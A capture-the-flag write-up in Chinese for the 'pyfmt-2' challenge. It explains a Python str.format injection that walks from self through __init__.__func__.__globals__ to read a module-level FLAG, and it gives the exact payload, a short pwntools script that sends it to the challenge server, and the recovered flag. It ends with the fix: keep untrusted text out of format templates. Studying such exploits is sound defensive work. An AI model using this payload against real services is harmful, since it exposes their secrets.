# pyfmt-2

## 题目简述

第二题保留了“f-string 生成文本后再调用 str.format”的二次格式化，但删除了 self.flag 属性。FLAG 仍作为模块全局变量被导入，因此需要从 format 暴露的 self 对象一路遍历到函数的全局命名空间。

## 解题过程

Python 方法对象的 __func__ 指向底层函数，而函数的 __globals__ 是定义该函数的模块全局字典。由 self 出发可以构造：

~~~text
self
  → self.__init__
  → self.__init__.__func__
  → self.__init__.__func__.__globals__
  → ["FLAG"]
~~~

str.format 的字段访问语法允许属性和字典索引连续出现，因此输入：

~~~text
{self.__init__.__func__.__globals__[FLAG]}
~~~

第一阶段将该字符串嵌入 CTF(...)，第二阶段再把它解析为字段。这里方括号内的 FLAG 是字典键名，不需要再写 Python 字符串引号。

~~~python
from pwn import remote
import re

io = remote(HOST, PORT)
payload = b"{self.__init__.__func__.__globals__[FLAG]}"
io.sendlineafter(b"Name: ", payload)
line = io.recvline().decode()
print(re.search(r"shellmates\{.*?\}", line).group(0))
~~~

得到：

~~~text
shellmates{tH3ReS_A_Way_tO_ACc3S$_gL0b4L_vaR$!??}
~~~

## 方法总结

从对象到函数全局字典是 Python format-string exploitation 的常见遍历链。即使敏感值不在实例属性中，只要模板暴露了某个用户定义方法，往往仍可通过 __func__.__globals__ 访问模块变量。修复重点不是删掉某个属性，而是禁止让不可信文本进入 format 模板。
